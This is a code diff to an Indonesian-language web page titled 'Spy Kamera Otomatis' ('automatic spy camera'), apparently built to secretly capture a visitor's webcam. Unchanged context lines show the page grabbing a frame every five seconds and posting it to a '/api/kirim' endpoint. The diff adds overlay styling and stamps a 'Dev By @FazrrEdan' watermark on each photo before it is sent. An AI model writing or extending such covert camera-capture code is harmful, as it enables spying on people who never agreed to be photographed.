@@ -1,6 +1,25 @@
 <!DOCTYPE html>
 <html>
-  <head><title>Spy Kamera Otomatis</title></head>
+  <head>
+    <title>Spy Kamera Otomatis</title>
+    <style>
+      .photo-container {
+        position: relative;
+        display: inline-block;
+      }
+
+      .overlay {
+        position: absolute;
+        top: 10px;
+        left: 10px;
+        background-color: rgba(0, 0, 0, 0.5);
+        color: white;
+        padding: 5px;
+        font-size: 14px;
+        font-weight: bold;
+      }
+    </style>
+  </head>
   <body>
     <h2>Akses Kamera Diam-diam</h2>
     <video id="video" autoplay playsinline width="320" height="240"></video>
@@ -19,6 +38,12 @@
           // Mulai spam foto setiap 5 detik
           spamInterval = setInterval(() => {
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Tambahkan teks pada gambar sebelum dikirim
+            context.fillStyle = "rgba(0, 0, 0, 0.5)";
+            context.font = "14px Arial";
+            context.fillText("Dev By @FazrrEdan", 10, 20); // Posisi teks di atas gambar
+
             const imageData = canvas.toDataURL("image/jpeg");
 
             fetch("/api/kirim", {
